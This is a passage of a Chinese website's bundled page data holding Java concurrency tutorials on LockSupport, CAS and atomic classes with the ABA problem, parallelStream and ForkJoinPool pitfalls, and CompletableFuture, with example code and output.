是一个非常方便实用线程阻塞工具，它可以在线程内任意位置让线程阻塞。和 thread.suspend () 相比，它弥补了由于 resume () 在前发生，导致线程无法继续执行的情况。和 object.wait () 相比，它不需要先获得某个对象锁，也不会抛出 中断异常，中断异常可以在线程中获取 thread.currentthread ().isinterrupted () 来得知。\n\n    public static void main(string[] args) throws interruptedexception {\n        string a = "1";\n        thread[] threads = new thread[2];\n        for(int i=0;i<2;i++){\n            int b = i;\n            threads[i] = new thread(() -> {\n                try {\n                    system.out.println("线程启动 " + b);\n//                  提前使用解锁\n                    locksupport.unpark(thread.currentthread());\n                    locksupport.park();\n                    thread.sleep(3000);\n                    system.out.println("执行完毕 " + b);\n                } catch (exception e) {\n                    system.out.println("老子被中断了 " + b);\n                    // 这里必须在中断一次，否则\n                    thread.currentthread().interrupt();\n                }\n            });\n        }\n        threads[0].start();\n//        locksupport.unpark(threads[0]);\n        threads[1].start();\n    }\n输出结果：\n线程启动 0\n执行完毕 0\n线程启动 1\n执行完毕 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 十、无锁\n\n   对于并发控制而言，锁是一种悲观策略。它总是假设每一次的临界区操作会产生冲突，因此，必须对每次操作都小心翼翼。如果有多个线程同时访问临界区资源，就宁可牺牲让线程等待，所以说锁会阻塞线程执行。而无锁是一种乐观的策略，它会假设对资源的访问没有冲突的。既然没有冲突，自然不需要等待，所以所有的线程都可以在不停顿的状态下持续执行。那遇到冲突怎么办？无锁的策略使用一种叫做比较交换的技术 (cas compare and swap) 来鉴别线程冲突，一旦检测到冲突产生，就重试当前操作直到没有冲突位置。\n   与锁相比，使用比较交换 (cas) 会使程序看起来更加复杂一些。但由于其非阻塞性，它对死锁问题天生免疫，并且，线程间的相互影响也远远比基于锁的方式要小。更为重要的是，使用无锁的方式完全没有锁竞争带来的系统开销，也没有线程间频繁调度带来的开销，因此，它要比基于锁的方式拥有更优越的性能。\n   cas 的算法过程是这样的：它包含三个参数 cas (v,e,n)。v 表示要更新的变量，e 表示预期值，n 表示新值。仅当 v 值等于 e 值时，才会将 v 的值设为 n，如果 v 值和 e 值不同，则说明已经有其他线程做了更新，则当前线程什么都不做。最后，cas 返回当前 v 的真实值。cas 操作时抱着乐观的态度进行，他总是认为自己可以完成操作。当多个线程同时使用 cas 操作一个变量时，只有一个会胜出，并且成功更新，其余均会失败。失败的线程不会被挂起，仅是被告知失败，并且允许再次尝试，当然也允许失败的线程放弃操作。基于这样的原理，cas 操作即使没有锁，也可以发现其他线程对当前线程的干扰，并进行恰当的处理。\n\n\n# atomicinteger 无锁的系统安全整数\n\n    public static void main(string[] args) throws interruptedexception {\n        atomicinteger atomicinteger = new atomicinteger(0);\n        for(int i=0;i<100;i++){\n            new thread(() -> {\n                for(int j=0;j<100;j++){\n                    if(atomicinteger.incrementandget() == 100){\n                        system.out.println("卧槽");\n                    }\n                }\n            }).start();\n        }\n        thread.sleep(4000);\n        system.out.println(atomicinteger.get());\n    }\n输出结果：\n卧槽\n10000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n * get () 取得当前值\n * set (int newvalue) 设置当前值\n * getandset (int newvalue) 设置新值，并返回旧值\n * compareandset (int expect, int update) 如果当前值为 expect (期望)，则设置为 update (新)\n * getandincrement () 当前值 + 1，返回旧值\n * getanddecrement () 当前值 - 1，返回旧值\n * getandadd (int delta) 当前值 + delta，返回旧值\n * addandget (int delta) 当前值 + delta，返回新值\n * incrementandget () 当前值 + 1，返回新值\n * decrementandget () 当前值 - 1，返回新值\n\n\n# atomicreference 无锁对象引用 和 atomicstampedreference 带有时间戳的对象引用\n\n   atomicreference 和 atomicinteger 非常类似，不同之处就在于 atomicinteger 是对整数的封装，而 atomicreference 则对应普通的对象引用。也就是它可以保证你在修改对象引用时的线程安全性。\n\n@data\n@accessors(chain = true)\nclass account{\n    private integer amount = 0;\n}\n\npublic static void main(string[] args) throws interruptedexception {\n    account account = new account();\n    account.setamount(10);\n    atomicreference<account> accountatomicreference = new atomicreference<account>();\n    accountatomicreference.set(account);\n    // 模拟充值\n    for(int i=0;i<3;i++){\n        new thread(() -> {\n            account clientaccount = accountatomicreference.get();\n            system.out.println("充值前查询越还有 "+ clientaccount.getamount());\n            if(clientaccount.getamount() < 20){\n                if(accountatomicreference.compareandset(clientaccount,clientaccount.setamount(clientaccount.getamount() + 20) )){\n                    system.out.println("余额小于20元，充值成功，余额："+ clientaccount.getamount());\n                }\n            }\n        }).start();\n    }\n}\n输出结果：\n充值前查询越还有 10\n充值前查询越还有 10\n充值前查询越还有 10\n余额小于20元，充值成功，余额：30\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n   以上列子可以看到，多线程间操作同一个实例对象，只会有一个成功。但这种模式存在一个 aba 问题，就是，在线程操作前，这个值很可能被其他线程用去做其他的，导致值被使用后又换回来，当前线程一查看值没问题继续使用，造成数据被借用，我们还傻傻的不知道，这也是安全性问题。但这种情况就需要看我们的业务是否需要解决。\n   解决办法呢就是使用 atomicstampedreference 带有时间戳的对象引用，与其说时间戳，更像是一个修改标记，每次消费的时候，或者充值的时候我都给修改标记 + 1，一旦和我的原始标记不一样，我就不让其继续充值，只让其消费。\n\npublic static void main(string[] args) throws interruptedexception {\n    account account = new account();\n    account.setamount(10);\n    atomicstampedreference<account> accountatomicreference = new atomicstampedreference<account>(account,0);\n    // 模拟充值\n    for(int i=0;i<3;i++){\n        int stamp = accountatomicreference.getstamp();\n        new thread(() -> {\n            while (true) {\n                account clientaccount = accountatomicreference.getreference();\n                system.out.println("充值前查询余额还有 " + clientaccount.getamount());\n                if (clientaccount.getamount() < 20) {\n                    if (accountatomicreference.compareandset(clientaccount, clientaccount.setamount(clientaccount.getamount() + 20),stamp,stamp+1)) {\n                        system.out.println("余额小于20元，充值成功，余额：" + clientaccount.getamount());\n                    }\n                }else {\n                    system.out.println("当前用户 充值过不能再充值");\n                    break;\n                }\n            }\n        }).start();\n    }\n    // 模拟消费\n    for(int i=0;i<3;i++){\n        new thread(() -> {\n            while (true) {\n                int stamp = accountatomicreference.getstamp();\n                account clientaccount = accountatomicreference.getreference();\n                system.out.println("消费前查询余额还有 " + clientaccount.getamount());\n                if (clientaccount.getamount() >= 10) {\n                    if (accountatomicreference.compareandset(clientaccount, clientaccount.setamount(clientaccount.getamount() - 10),stamp,stamp+1)) {\n                        system.out.println("成功消费10元，余额还有：" + clientaccount.getamount());\n                    }\n                }else{\n                    system.out.println("余额不够");\n                    break;\n                }\n            }\n        }).start();\n    }\n}\n输出结果：\n充值前查询余额还有 10\n余额小于20元，充值成功，余额：30\n充值前查询余额还有 30\n当前用户 充值过不能再充值\n消费前查询余额还有 30\n成功消费10元，余额还有：20\n消费前查询余额还有 20\n成功消费10元，余额还有：10\n消费前查询余额还有 10\n成功消费10元，余额还有：0\n消费前查询余额还有 0\n余额不够\n消费前查询余额还有 0\n余额不够\n充值前查询余额还有 0\n充值前查询余额还有 20\n当前用户 充值过不能再充值\n消费前查询余额还有 20\n成功消费10元，余额还有：10\n消费前查询余额还有 10\n成功消费10元，余额还有：0\n消费前查询余额还有 0\n余额不够\n充值前查询余额还有 10\n充值前查询余额还有 20\n当前用户 充值过不能再充值\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n\n\n   如果说在充值的时候加一个条件，让其只能充值 1 次，如果我们用 atomicreference 是完全做不到的，因为他不会记录，需要我们自己去添加一个全局变量去维护，但使用 atomicstampedreference 就可以做到，因为它本身就维护了一个标记，而且还帮我们解决了 aba 问题，如果说值被其他线程冒用，标记就会 + 1，使得和当前线程的标记不一样，则保留值退出。\n\n   出了 atomicinteger 和 atomicreference 还有 atomicreferencearray atomicintegerarray 等，具体的 api 都是差不多的。',charsets:{cjk:!0}},{title:"JAVA8 新特性总结",frontmatter:{title:"JAVA8 新特性总结",date:"2023-06-25T09:22:36.000Z",permalink:"/language/java/version/1/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/00.%E8%AF%AD%E8%A8%80/01.JAVA/03.%E7%89%88%E6%9C%AC/1.JAVA8%20%E6%96%B0%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93.html",relativePath:"00.语言/01.JAVA/03.版本/1.JAVA8 新特性总结.md",key:"v-182bbd6a",path:"/language/java/version/1/",headers:[{level:2,title:"parallelStream 及CompletableFuture实战",slug:"parallelstream-及completablefuture实战",normalizedTitle:"parallelstream 及 completablefuture 实战",charIndex:2},{level:3,title:"parallelStream",slug:"parallelstream",normalizedTitle:"parallelstream",charIndex:2},{level:3,title:"CompletableFuture",slug:"completablefuture",normalizedTitle:"completablefuture",charIndex:19}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"parallelStream 及CompletableFuture实战 parallelStream CompletableFuture",content:'# parallelStream 及 CompletableFuture 实战\n\n\n# parallelStream\n\nabout Stream\n什么是流？\n\nStream 是 java8 中新增加的一个特性，被 java 猿统称为流.\n\nStream 不是集合元素，它不是数据结构并不保存数据，它是有关算法和计算的，它更像一个高级版本的 Iterator。原始版本的 Iterator，用户只能显式地一个一个遍历元素并对其执行某些操作；高级版本的 Stream，用户只要给出需要对其包含的元素执行什么操作，比如 “过滤掉长度大于 10 的字符串”、“获取每个字符串的首字母” 等，Stream 会隐式地在内部进行遍历，做出相应的数据转换。\n\nStream 就如同一个迭代器（Iterator），单向，不可往复，数据只能遍历一次，遍历过一次后即用尽了，就好比流水从面前流过，一去不复返。\n\n而和迭代器又不同的是，Stream 可以并行化操作，迭代器只能命令式地、串行化操作。顾名思义，当使用串行方式去遍历时，每个 item 读完后再读下一个 item。而使用并行去遍历时，数据会被分成多个段，其中每一个都在不同的线程中处理，然后将结果一起输出。Stream 的并行操作依赖于 Java7 中引入的 Fork/Join 框架（JSR166y）来拆分任务和加速处理过程。Java 的并行 API 演变历程基本如下：\n\n> 1.0-1.4 中的 java.lang.Thread\n> 5.0 中的 java.util.concurrent\n> 6.0 中的 Phasers 等\n> 7.0 中的 Fork/Join 框架\n> 8.0 中的 Lambda\n\nStream 的另外一大特点是，数据源本身可以是无限的。\n\nparallelStream 是什么\nparallelStream 其实就是一个并行执行的流。它通过默认的 ForkJoinPool, 可能提高你的多线程任务的速度.\n\nparallelStream 的作用\nStream 具有平行处理能力，处理的过程会分而治之，也就是将一个大任务切分成多个小任务，这表示每个任务都是一个操作，因此像以下的程式片段：\n\nList<Integer> numbers = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9);\nnumbers.parallelStream()\n       .forEach(out::println); \n\n\n1\n2\n3\n\n\n你得到的展示顺序不一定会是 1、2、3、4、5、6、7、8、9，而可能是任意的顺序，就 forEach () 这个操作來讲，如果平行处理时，希望最后顺序是按照原来 Stream 的数据顺序，那可以调用 forEachOrdered ()。例如：\n\nList<Integer> numbers = Arrays.asList(1, 2, 3, 4, 5, 6, 7, 8, 9);\nnumbers.parallelStream()\n       .forEachOrdered(out::println);\n\n\n1\n2\n3\n\n\n注意：如果 forEachOrdered () 中间有其他如 filter () 的中介操作，会试着平行化处理，然后最终 forEachOrdered () 会以原数据顺序处理，因此，使用 forEachOrdered () 这类的有序处理，可能会（或完全失去）失去平行化的一些优势，实际上中介操作亦有可能如此，例如 sorted () 方法。\n\nparallelStream 背后的男人：ForkJoinPool\n要想深入的研究 parallelStream 之前，那么我们必须先了解 ForkJoin 框架和 ForkJoinPool. 本文旨在 parallelStream, 但因为两种关系甚密，故在此简单介绍一下 ForkJoinPool, 如有兴趣可以更深入的去了解下 ForkJoin***(当然，如果你想真正的搞透 parallelStream, 那么你依然需要先搞透 ForkJoinPool).*\n\nForkJoin 框架是从 jdk7 中新特性，它同 ThreadPoolExecutor 一样，也实现了 Executor 和 ExecutorService 接口。它使用了一个无限队列来保存需要执行的任务，而线程的数量则是通过构造函数传入，如果没有向构造函数中传入希望的线程数量，那么当前计算机可用的 CPU 数量会被设置为线程数量作为默认值。\n\nForkJoinPool 主要用来使用分治法 (Divide-and-Conquer Algorithm) 来解决问题。典型的应用比如快速排序算法。这里的要点在于，ForkJoinPool 需要使用相对少的线程来处理大量的任务。比如要对 1000 万个数据进行排序，那么会将这个任务分割成两个 500 万的排序任务和一个针对这两组 500 万数据的合并任务。以此类推，对于 500 万的数据也会做出同样的分割处理，到最后会设置一个阈值来规定当数据规模到多少时，停止这样的分割处理。比如，当元素的数量小于 10 时，会停止分割，转而使用插入排序对它们进行排序。那么到最后，所有的任务加起来会有大概 2000000 + 个。问题的关键在于，对于一个任务而言，只有当它所有的子任务完成之后，它才能够被执行。\n\n所以当使用 ThreadPoolExecutor 时，使用分治法会存在问题，因为 ThreadPoolExecutor 中的线程无法像任务队列中再添加一个任务并且在等待该任务完成之后再继续执行。而使用 ForkJoinPool 时，就能够让其中的线程创建新的任务，并挂起当前的任务，此时线程就能够从队列中选择子任务执行。\n\n那么使用 ThreadPoolExecutor 或者 ForkJoinPool，会有什么性能的差异呢？\n首先，使用 ForkJoinPool 能够使用数量有限的线程来完成非常多的具有父子关系的任务，比如使用 4 个线程来完成超过 200 万个任务。但是，使用 ThreadPoolExecutor 时，是不可能完成的，因为 ThreadPoolExecutor 中的 Thread 无法选择优先执行子任务，需要完成 200 万个具有父子关系的任务时，也需要 200 万个线程，显然这是不可行的。\n\n工作窃取算法\nforkjoin 最核心的地方就是利用了现代硬件设备多核，在一个操作时候会有空闲的 cpu, 那么如何利用好这个空闲的 cpu 就成了提高性能的关键，而这里我们要提到的工作窃取（work-stealing）算法就是整个 forkjion 框架的核心理念，工作窃取（work-stealing）算法是指某个线程从其他队列里窃取任务来执行。\n\n那么为什么需要使用工作窃取算法呢？\n假如我们需要做一个比较大的任务，我们可以把这个任务分割为若干互不依赖的子任务，为了减少线程间的竞争，于是把这些子任务分别放到不同的队列里，并为每个队列创建一个单独的线程来执行队列里的任务，线程和队列一一对应，比如 A 线程负责处理 A 队列里的任务。但是有的线程会先把自己队列里的任务干完，而其他线程对应的队列里还有任务等待处理。干完活的线程与其等着，不如去帮其他线程干活，于是它就去其他线程的队列里窃取一个任务来执行。而在这时它们会访问同一个队列，所以为了减少窃取任务线程和被窃取任务线程之间的竞争，通常会使用双端队列，被窃取任务线程永远从双端队列的头部拿任务执行，而窃取任务的线程永远从双端队列的尾部拿任务执行。\n\n> 工作窃取算法的优点是充分利用线程进行并行计算，并减少了线程间的竞争，其缺点是在某些情况下还是存在竞争，比如双端队列里只有一个任务时。并且消耗了更多的系统资源，比如创建多个线程和多个双端队列。\n\n用看 forkjion 的眼光来看 ParallelStreams\n上文中已经提到了在 Java 8 引入了自动并行化的概念。它能够让一部分 Java 代码自动地以并行的方式执行，也就是我们使用了 ForkJoinPool 的 ParallelStream。\n\nJava 8 为 ForkJoinPool 添加了一个通用线程池，这个线程池用来处理那些没有被显式提交到任何线程池的任务。它是 ForkJoinPool 类型上的一个静态元素，它拥有的默认线程数量等于运行计算机上的处理器数量。当调用 Arrays 类上添加的新方法时，自动并行化就会发生。比如用来排序一个数组的并行快速排序，用来对一个数组中的元素进行并行遍历。自动并行化也被运用在 Java 8 新添加的 Stream API 中。\n\n比如下面的代码用来遍历列表中的元素并执行需要的操作：\n\n    List<UserInfo> userInfoList =\n        DaoContainers.getUserInfoDAO().queryAllByList(new UserInfoModel());\n    userInfoList.parallelStream().forEach(RedisUserApi::setUserIdUserInfo);\n\n\n1\n2\n3\n\n\n对于列表中的元素的操作都会以并行的方式执行。forEach 方法会为每个元素的计算操作创建一个任务，该任务会被前文中提到的 ForkJoinPool 中的通用线程池处理。以上的并行计算逻辑当然也可以使用 ThreadPoolExecutor 完成，但是就代码的可读性和代码量而言，使用 ForkJoinPool 明显更胜一筹。\n\n对于 ForkJoinPool 通用线程池的线程数量，通常使用默认值就可以了，即运行时计算机的处理器数量。我这里提供了一个示例的代码让你了解 jvm 所使用的 ForkJoinPool 的线程数量，你可以可以通过设置系统属性：-Djava.util.concurrent.ForkJoinPool.common.parallelism=N （N 为线程数量）, 来调整 ForkJoinPool 的线程数量，可以尝试调整成不同的参数来观察每次的输出结果:\n\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.Set;\nimport java.util.concurrent.CopyOnWriteArraySet;\nimport java.util.concurrent.CountDownLatch;\n\n/**\n * @description 这是一个用来让你更加熟悉parallelStream的原理的实力\n * @version v1.0\n */\npublic class App {\n    public static void main(String[] args) throws Exception {\n        System.out.println("Hello World!");\n        // 构造一个10000个元素的集合\n        List<Integer> list = new ArrayList<>();\n        for (int i = 0; i < 10000; i++) {\n            list.add(i);\n        }\n        // 统计并行执行list的线程\n        Set<Thread> threadSet = new CopyOnWriteArraySet<>();\n        // 并行执行\n        list.parallelStream().forEach(integer -> {\n            Thread thread = Thread.currentThread();\n            // System.out.println(thread);\n            // 统计并行执行list的线程\n            threadSet.add(thread);\n        });\n        System.out.println("threadSet一共有" + threadSet.size() + "个线程");\n        System.out.println("系统一个有"+Runtime.getRuntime().availableProcessors()+"个cpu");\n        List<Integer> list1 = new ArrayList<>();\n        List<Integer> list2 = new ArrayList<>();\n        for (int i = 0; i < 100000; i++) {\n            list1.add(i);\n            list2.add(i);\n        }\n        Set<Thread> threadSetTwo = new CopyOnWriteArraySet<>();\n        CountDownLatch countDownLatch = new CountDownLatch(2);\n        Thread threadA = new Thread(() -> {\n            list1.parallelStream().forEach(integer -> {\n                Thread thread = Thread.currentThread();\n                // System.out.println("list1" + thread);\n                threadSetTwo.add(thread);\n            });\n            countDownLatch.countDown();\n        });\n        Thread threadB = new Thread(() -> {\n            list2.parallelStream().forEach(integer -> {\n                Thread thread = Thread.currentThread();\n                // System.out.println("list2" + thread);\n                threadSetTwo.add(thread);\n            });\n            countDownLatch.countDown();\n        });\n\n        threadA.start();\n        threadB.start();\n        countDownLatch.await();\n        System.out.print("threadSetTwo一共有" + threadSetTwo.size() + "个线程");\n\n        System.out.println("---------------------------");\n        System.out.println(threadSet);\n        System.out.println(threadSetTwo);\n        System.out.println("---------------------------");\n        threadSetTwo.addAll(threadSet);\n        System.out.println(threadSetTwo);\n        System.out.println("threadSetTwo一共有" + threadSetTwo.size() + "个线程");\n        System.out.println("系统一个有"+Runtime.getRuntime().availableProcessors()+"个cpu");\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n\n\n出现这种现象的原因是，forEach 方法用了一些小把戏。它会将执行 forEach 本身的线程也作为线程池中的一个工作线程。因此，即使将 ForkJoinPool 的通用线程池的线程数量设置为 1，实际上也会有 2 个工作线程。因此在使用 forEach 的时候，线程数为 1 的 ForkJoinPool 通用线程池和线程数为 2 的 ThreadPoolExecutor 是等价的。\n\n所以当 ForkJoinPool 通用线程池实际需要 4 个工作线程时，可以将它设置成 3，那么在运行时可用的工作线程就是 4 了。\n小结:\n\n>  1. 当需要处理递归分治算法时，考虑使用 ForkJoinPool。\n>  2. 仔细设置不再进行任务划分的阈值，这个阈值对性能有影响。\n>  3. Java 8 中的一些特性会使用到 ForkJoinPool 中的通用线程池。在某些场合下，需要调整该线程池的默认的线程数量。\n\nParallelStreams 的陷阱\n上文中我们已经看到了 ParallelStream 他强大无比的特性，但这里我们就讲告诉你 ParallelStreams 不是万金油，而是一把双刃剑，如果错误的使用反倒可能伤人伤己.\n\n以下是一个我们项目里使用 parallel streams 的很常见的情况。在这个例子中，我们想同时调用不同地址的 api 中并且获得第一个返回的结果。\n\n    public static String query(String q, List<String> engines) {      Optional<String> result = engines.stream().parallel().map((base) -> {\n        String url = base + q;\n        return WS.url(url).get();\n      }).findAny();\n      return result.get();\n    }\n\n\n1\n2\n3\n4\n5\n6\n\n\n可能有很多朋友在 jdk7 用 future 配合 countDownLatch 自己实现的这个功能，但是 jdk8 的朋友基本都会用上面的实现方式，那么自信深究一下究竟自己用 future 实现的这个功能和利用 jdk8 的 parallelStream 来实现这个功能有什么不同点呢？坑又在哪里呢？\n\n让我们细思思考一下整个功能究竟是如何运转的。首先我们的集合元素 engines 由 ParallelStreams 并行的去进行 map 操作 (ParallelStreams 使用 JVM 默认的 forkJoin 框架的线程池由当前线程去执行并行操作).\n\n然而，这里需要注意的一地方是我们在调用第三方的 api 请求是一个响应略慢而且会阻塞操作的一个过程。所以在某时刻所有线程都会调用 get () 方法并且在那里等待结果返回.\n\n再回过头仔细思考一下这个功能的实现过程是我们一开始想要的吗？我们是在同一时间等待所有的结果，而不是遍历这个列表按顺序等待每个回答。然而，由于 ForkJoinPool workders 的存在，这样平行的等待相对于使用主线程的等待会产生的一种副作用.\n\n现在 ForkJoin pool (关于 forkjion 的更多实现你可以去搜索引擎中去看一下他的具体实现方式) 的实现是：它并不会因为产生了新的 workers 而抵消掉阻塞的 workers。那么在某个时间所有 ForkJoinPool.common () 的线程都会被用光。也就是说，下一次你调用这个查询方法，就可能会在一个时间与其他的 parallel stream 同时运行，而导致第二个任务的性能大大受损。或者说，例如你在这个功能里是用来快速返回调用的第三方 api 的，而在其他的功能里是用于一些简单的数据并行计算的，但是假如你先调用了这个功能，同一时间之后调用计算的函数，那么这里 forkjionPool 的实现会让你计算的函数大打折扣.\n\n不过也不要急着去吐槽 ForkJoinPool 的实现，在不同的情况下你可以给它一个 ManagedBlocker 实例并且确保它知道在一个阻塞调用中应该什么时候去抵消掉卡住的 workers. 现在有意思的一点是，在一个 parallel stream 处理中并不一定是阻塞调用会拖延程序的性能。任何被用于映射在一个集合上的长时间运行的函数都会产生同样的问题.\n\n正如我们上面那个列子的情况分析得知，lambda 的执行并不是瞬间完成的，所有使用 parallel streams 的程序都有可能成为阻塞程序的源头，并且在执行过程中程序中的其他部分将无法访问这些 workers, 这意味着任何依赖 parallel streams 的程序在什么别的东西占用着 common ForkJoinPool 时将会变得不可预知并且暗藏危机.\n\n怎么正确使用 parallelStream\n如果你正在写一个其他地方都是单线程的程序并且准确地知道什么时候你应该要使用 parallel streams，这样的话你可能会觉得这个问题有一点肤浅。然而，我们很多人是在处理 web 应用、各种不同的框架以及重量级应用服务。一个服务器是怎样被设计成一个可以支持多种独立应用的主机的？谁知道呢，给你一个可以并行的却不能控制输入的 parallel stream.\n\n很抱歉，请原谅我用的标注 [怎么正确使用 parallelStream], 因为目前为止我也没有发现一个好的方式来让我真正的正确使用 parallelStream. 下面的网上写的两种方式:\n\n一种方式是限制 ForkJoinPool 提供的并行数。可以通过使用 - Djava.util.concurrent.ForkJoinPool.common.parallelism=1 来限制线程池的大小为 1。不再从并行化中得到好处可以杜绝错误的使用它 (其实这个方式还是有点搞笑的，既然这样搞那我还不如不去使用并行流)。\n\n另一种方式就是，一个被称为工作区的可以让 ForkJoinPool 平行放置的 parallelStream () 实现。不幸的是现在的 JDK 还没有实现。\n\nParallel streams 是无法预测的，而且想要正确地使用它有些棘手。几乎任何 parallel streams 的使用都会影响程序中无关部分的性能，而且是一种无法预测的方式。。但是在调用 stream.parallel () 或者 parallelStream () 时候在我的代码里之前我仍然会重新审视一遍他给我的程序究竟会带来什么问题，他能有多大的提升，是否有使用他的意义.\n\nstream or parallelStream？\n上面我们也看到了 parallelStream 所带来的隐患和好处，那么，在从 stream 和 parallelStream 方法中进行选择时，我们可以考虑以下几个问题：\n\n>  1. 是否需要并行？\n>  2. 任务之间是否是独立的？是否会引起任何竞态条件？\n>  3. 结果是否取决于任务的调用顺序？\n\n对于问题 1，在回答这个问题之前，你需要弄清楚你要解决的问题是什么，数据量有多大，计算的特点是什么？并不是所有的问题都适合使用并发程序来求解，比如当数据量不大时，顺序执行往往比并行执行更快。毕竟，准备线程池和其它相关资源也是需要时间的。但是，当任务涉及到 I/O 操作并且任务之间不互相依赖时，那么并行化就是一个不错的选择。通常而言，将这类程序并行化之后，执行速度会提升好几个等级。\n\n对于问题 2，如果任务之间是独立的，并且代码中不涉及到对同一个对象的某个状态或者某个变量的更新操作，那么就表明代码是可以被并行化的。\n\n对于问题 3，由于在并行环境中任务的执行顺序是不确定的，因此对于依赖于顺序的任务而言，并行化也许不能给出正确的结果。\n\n\n# CompletableFuture\n\nCompletableFuture 是一个异步编程 api，用的是 forkjoin 的线程实现，可以帮我们达到使用多核处理任务的效果。CompletableFuture 提供了 supplyAsync 和 runAsync 两个方法，supplyAsync 异步完成后返回一个具体的数据，runAsync 直接就是异步执行，执行完便结束了。我们来看看简单的用法：\n\n * supplyAsync ().thenCompose () 方法允许你对两个异步操作进行流水线，第一个操作完成时，将其结果作为参数传递给第二个操作\n * supplyAsync ().thenCombine () 你需要将两个完全不相干的 CompletableFuture 对象的结果整合起来，而且你也不希望等到第一个任务完全结束才开始第二项任务\n * supplyAsync ().thenAccept () 它接收 CompletableFuture 执行完毕后的返回值做参数\n * supplyAsync ().thenApply () 该方法会等 CompletableFuture 执行完第一个结果 就调用其执行.',normalizedContent:'# parallelstream 及 completablefuture 实战\n\n\n# parallelstream\n\nabout stream\n什么是流？\n\nstream 是 java8 中新增加的一个特性，被 java 猿统称为流.\n\nstream 不是集合元素，它不是数据结构并不保存数据，它是有关算法和计算的，它更像一个高级版本的 iterator。原始版本的 iterator，用户只能显式地一个一个遍历元素并对其执行某些操作；高级版本的 stream，用户只要给出需要对其包含的元素执行什么操作，比如 “过滤掉长度大于 10 的字符串”、“获取每个字符串的首字母” 等，stream 会隐式地在内部进行遍历，做出相应的数据转换。\n\nstream 就如同一个迭代器（iterator），单向，不可往复，数据只能遍历一次，遍历过一次后即用尽了，就好比流水从面前流过，一去不复返。\n\n而和迭代器又不同的是，stream 可以并行化操作，迭代器只能命令式地、串行化操作。顾名思义，当使用串行方式去遍历时，每个 item 读完后再读下一个 item。而使用并行去遍历时，数据会被分成多个段，其中每一个都在不同的线程中处理，然后将结果一起输出。stream 的并行操作依赖于 java7 中引入的 fork/join 框架（jsr166y）来拆分任务和加速处理过程。java 的并行 api 演变历程基本如下：\n\n> 1.0-1.4 中的 java.lang.thread\n> 5.0 中的 java.util.concurrent\n> 6.0 中的 phasers 等\n> 7.0 中的 fork/join 框架\n> 8.0 中的 lambda\n\nstream 的另外一大特点是，数据源本身可以是无限的。\n\nparallelstream 是什么\nparallelstream 其实就是一个并行执行的流。它通过默认的 forkjoinpool, 可能提高你的多线程任务的速度.\n\nparallelstream 的作用\nstream 具有平行处理能力，处理的过程会分而治之，也就是将一个大任务切分成多个小任务，这表示每个任务都是一个操作，因此像以下的程式片段：\n\nlist<integer> numbers = arrays.aslist(1, 2, 3, 4, 5, 6, 7, 8, 9);\nnumbers.parallelstream()\n       .foreach(out::println); \n\n\n1\n2\n3\n\n\n你得到的展示顺序不一定会是 1、2、3、4、5、6、7、8、9，而可能是任意的顺序，就 foreach () 这个操作來讲，如果平行处理时，希望最后顺序是按照原来 stream 的数据顺序，那可以调用 foreachordered ()。例如：\n\nlist<integer> numbers = arrays.aslist(1, 2, 3, 4, 5, 6, 7, 8, 9);\nnumbers.parallelstream()\n       .foreachordered(out::println);\n\n\n1\n2\n3\n\n\n注意：如果 foreachordered () 中间有其他如 filter () 的中介操作，会试着平行化处理，然后最终 foreachordered () 会以原数据顺序处理，因此，使用 foreachordered () 这类的有序处理，可能会（或完全失去）失去平行化的一些优势，实际上中介操作亦有可能如此，例如 sorted () 方法。\n\nparallelstream 背后的男人：forkjoinpool\n要想深入的研究 parallelstream 之前，那么我们必须先了解 forkjoin 框架和 forkjoinpool. 本文旨在 parallelstream, 但因为两种关系甚密，故在此简单介绍一下 forkjoinpool, 如有兴趣可以更深入的去了解下 forkjoin***(当然，如果你想真正的搞透 parallelstream, 那么你依然需要先搞透 forkjoinpool).*\n\nforkjoin 框架是从 jdk7 中新特性，它同 threadpoolexecutor 一样，也实现了 executor 和 executorservice 接口。它使用了一个无限队列来保存需要执行的任务，而线程的数量则是通过构造函数传入，如果没有向构造函数中传入希望的线程数量，那么当前计算机可用的 cpu 数量会被设置为线程数量作为默认值。\n\nforkjoinpool 主要用来使用分治法 (divide-and-conquer algorithm) 来解决问题。典型的应用比如快速排序算法。这里的要点在于，forkjoinpool 需要使用相对少的线程来处理大量的任务。比如要对 1000 万个数据进行排序，那么会将这个任务分割成两个 500 万的排序任务和一个针对这两组 500 万数据的合并任务。以此类推，对于 500 万的数据也会做出同样的分割处理，到最后会设置一个阈值来规定当数据规模到多少时，停止这样的分割处理。比如，当元素的数量小于 10 时，会停止分割，转而使用插入排序对它们进行排序。那么到最后，所有的任务加起来会有大概 2000000 + 个。问题的关键在于，对于一个任务而言，只有当它所有的子任务完成之后，它才能够被执行。\n\n所以当使用 threadpoolexecutor 时，使用分治法会存在问题，因为 threadpoolexecutor 中的线程无法像任务队列中再添加一个任务并且在等待该任务完成之后再继续执行。而使用 forkjoinpool 时，就能够让其中的线程创建新的任务，并挂起当前的任务，此时线程就能够从队列中选择子任务执行。\n\n那么使用 